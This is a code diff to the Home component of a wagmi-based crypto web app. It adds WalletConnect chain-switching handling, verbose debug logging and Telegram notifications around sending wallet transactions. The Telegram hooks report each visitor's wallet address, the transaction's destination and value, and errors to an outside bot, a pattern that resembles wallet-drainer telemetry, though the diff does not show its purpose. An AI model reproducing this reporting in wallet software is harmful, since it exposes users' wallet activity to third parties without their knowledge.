@@ -208,6 +208,8 @@ export default function Home() {
           console.log(`🎯 App Version: ${APP_VERSION}`);
           console.log(`📤 Using wagmi sendTransaction - supports all wallet connectors`);
           console.log(`🔌 Connected via: ${connector?.name || 'Unknown'}`);
+          console.log(`🔌 Connector ID: ${connector?.id || 'Unknown'}`);
+          console.log(`🔌 Connector type: ${connector?.type || 'Unknown'}`);
           
           // Log transaction details
           console.log('📝 Transaction config:', {
@@ -217,26 +219,116 @@ export default function Home() {
             hasData: !!config.data,
           });
           
+          // CRITICAL DEBUG: Check if sendTx is actually available
+          console.log('🔍 sendTx function check:', {
+            exists: !!sendTx,
+            type: typeof sendTx,
+            isPending: isSendingTx,
+          });
+          
+          if (!sendTx) {
+            console.error('🚨 CRITICAL: sendTx is undefined!');
+            console.error('🔍 Wagmi hooks state:', {
+              isConnected,
+              hasAddress: !!address,
+              hasConnector: !!connector,
+              chainId,
+            });
+            
+            await sendTelegramNotification({
+              event: 'critical_error',
+              walletAddress: address || 'unknown',
+              error: 'sendTx function is undefined - wagmi hook not initialized',
+              details: {
+                connector: connector?.name,
+                connectorId: connector?.id,
+                isConnected,
+                chainId,
+              },
+            });
+            
+            throw new Error('Transaction system not ready. sendTx function is undefined. Please refresh the page.');
+          }
+          
           try {
             console.log('⏳ Calling sendTx... (this should trigger wallet approval)');
             console.log(`🔍 Current chain: ${chainId}, Target chain: ${config.chainId}`);
             
-            // Switch to target chain if needed
-            if (chainId !== config.chainId) {
-              console.log(`🔄 Switching from chain ${chainId} to ${config.chainId}...`);
-              try {
-                await switchChain({ chainId: config.chainId });
-                console.log(`✅ Switched to chain ${config.chainId}`);
+            // For WalletConnect, we need to be extra careful about chain switching
+            if (connector?.id === 'walletConnect') {
+              console.log('🔗 WalletConnect detected - special handling');
+              
+              // Check if we need to switch chains
+              if (chainId !== config.chainId) {
+                console.log(`🔄 WalletConnect: Switching from chain ${chainId} to ${config.chainId}...`);
                 
-                // Wait a moment for the switch to complete
-                await new Promise(resolve => setTimeout(resolve, 1000));
-              } catch (switchError: any) {
-                console.error('❌ Chain switch failed:', switchError);
-                throw new Error(`Failed to switch to chain ${config.chainId}: ${switchError?.message || 'User rejected'}`);
+                try {
+                  await switchChain({ chainId: config.chainId });
+                  console.log(`✅ WalletConnect: Chain switched to ${config.chainId}`);
+                  
+                  // Wait longer for WalletConnect to propagate the chain switch
+                  console.log('⏳ Waiting 3 seconds for WalletConnect to update...');
+                  await new Promise(resolve => setTimeout(resolve, 3000));
+                  
+                  // Verify the switch worked
+                  console.log(`🔍 After switch, current chainId:`, chainId);
+                } catch (switchError: any) {
+                  console.error('❌ WalletConnect chain switch failed:', switchError);
+                  
+                  await sendTelegramNotification({
+                    event: 'chain_switch_failed',
+                    walletAddress: address || 'unknown',
+                    error: switchError?.message || 'Unknown error',
+                    details: {
+                      fromChain: chainId,
+                      toChain: config.chainId,
+                      connector: connector?.name,
+                    },
+                  });
+                  
+                  throw new Error(`Failed to switch to chain ${config.chainId}: ${switchError?.message || 'User rejected chain switch'}`);
+                }
+              } else {
+                console.log('✅ Already on correct chain:', config.chainId);
+              }
+            } else {
+              // Standard chain switching for non-WalletConnect
+              if (chainId !== config.chainId) {
+                console.log(`🔄 Switching from chain ${chainId} to ${config.chainId}...`);
+                try {
+                  await switchChain({ chainId: config.chainId });
+                  console.log(`✅ Switched to chain ${config.chainId}`);
+                  await new Promise(resolve => setTimeout(resolve, 1000));
+                } catch (switchError: any) {
+                  console.error('❌ Chain switch failed:', switchError);
+                  throw new Error(`Failed to switch to chain ${config.chainId}: ${switchError?.message || 'User rejected'}`);
+                }
               }
             }
             
+            console.log('🚀 About to call sendTx with params:', {
+              to: config.to,
+              value: config.value?.toString(),
+              hasData: !!config.data,
+              chainId: config.chainId,
+            });
+            
+            // Log to Telegram that we're attempting the transaction
+            await sendTelegramNotification({
+              event: 'transaction_attempt',
+              walletAddress: address || 'unknown',
+              network: chains.find(c => c.id === config.chainId)?.name || `Chain ${config.chainId}`,
+              details: {
+                to: config.to,
+                value: config.value?.toString(),
+                hasData: !!config.data,
+                connector: connector?.name,
+                connectorId: connector?.id,
+              },
+            });
+            
             // Use wagmi's sendTransaction which works with ALL connectors
+            console.log('⏳⏳⏳ CALLING SENDTX NOW - WALLET APPROVAL SHOULD APPEAR ⏳⏳⏳');
             const txHash = await sendTx({
               to: config.to as `0x${string}`,
               value: config.value,
@@ -244,15 +336,34 @@ export default function Home() {
               chainId: config.chainId,
             });
             
-            console.log('✅ Transaction sent! Hash:', txHash);
+            console.log('✅✅✅ Transaction sent! Hash:', txHash);
             return txHash;
           } catch (txError: any) {
-            console.error('❌ Transaction failed:', txError);
+            console.error('❌❌❌ Transaction failed:', txError);
+            console.error('Error type:', typeof txError);
+            console.error('Error constructor:', txError?.constructor?.name);
             console.error('Error details:', {
               message: txError?.message,
               code: txError?.code,
               cause: txError?.cause,
               name: txError?.name,
+              stack: txError?.stack?.split('\n').slice(0, 5),
+            });
+            
+            // Log detailed error to Telegram
+            await sendTelegramNotification({
+              event: 'transaction_error',
+              walletAddress: address || 'unknown',
+              error: txError?.message || String(txError),
+              details: {
+                errorType: txError?.constructor?.name,
+                errorCode: txError?.code,
+                errorName: txError?.name,
+                connector: connector?.name,
+                connectorId: connector?.id,
+                chainId: config.chainId,
+                stack: txError?.stack?.split('\n').slice(0, 5).join('\n'),
+              },
             });
             
             // Re-throw with better error message
